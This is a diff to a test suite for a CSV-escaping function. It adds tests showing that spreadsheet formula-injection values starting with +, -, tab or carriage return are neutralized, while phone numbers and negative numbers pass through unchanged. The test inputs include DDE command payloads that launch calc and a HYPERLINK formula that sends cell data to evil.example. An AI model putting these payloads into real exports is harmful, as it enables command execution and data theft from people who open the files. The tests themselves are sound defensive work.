@@ -43,9 +43,43 @@ describe("csvEscape", () => {
     expect(csvEscape("@SUM(A1:A9)")).toBe("'@SUM(A1:A9)");
   });
 
-  test("leaves leading + and - alone (phones, negatives)", () => {
+  // Reworded from "leaves leading + and - alone": that pinned the bug
+  // (F264/F430/F584). Only plain phone/number values stay unmangled.
+  test("neutralizes leading + and - formulas", () => {
+    expect(csvEscape("+SUM(1)")).toBe("'+SUM(1)");
+    expect(csvEscape("-1+1")).toBe("'-1+1");
+    expect(csvEscape("-2+3")).toBe("'-2+3");
+    expect(csvEscape("+cmd|' /C calc'!A0")).toBe("'+cmd|' /C calc'!A0");
+    expect(csvEscape('+HYPERLINK("https://evil.example/?"&A2,"Click")')).toBe(
+      '"\'+HYPERLINK(""https://evil.example/?""&A2,""Click"")"'
+    );
+    // The second '+' (and the letters) disqualify the number exemption.
+    expect(csvEscape("+1+cmd|' /C calc'!A0")).toBe("'+1+cmd|' /C calc'!A0");
+    expect(csvEscape("-cmd|' /C calc'!A0")).toBe("'-cmd|' /C calc'!A0");
+  });
+
+  test("neutralizes leading TAB and CR (CR still gets quoted)", () => {
+    expect(csvEscape("\t=1+1")).toBe("'\t=1+1");
+    expect(csvEscape("\r=1+1")).toBe('"\'\r=1+1"');
+  });
+
+  test("plain phone numbers and numbers are left alone", () => {
     expect(csvEscape("+1 303-555-0101")).toBe("+1 303-555-0101");
+    expect(csvEscape("+1 (303) 555-0101")).toBe("+1 (303) 555-0101");
     expect(csvEscape("-42")).toBe("-42");
+    expect(csvEscape("-3.5")).toBe("-3.5");
+    // a comma forces quoting, not neutralization
+    expect(csvEscape("-1,234.50")).toBe('"-1,234.50"');
+  });
+
+  test("phone-like values containing letters are neutralized", () => {
+    expect(csvEscape("+1 (303) 555-CASE")).toBe("'+1 (303) 555-CASE");
+  });
+
+  test("a formula character that is not leading is untouched", () => {
+    expect(csvEscape("a=b")).toBe("a=b");
+    expect(csvEscape("Dana-Lee")).toBe("Dana-Lee");
+    expect(csvEscape("555-0101")).toBe("555-0101");
   });
 });
 
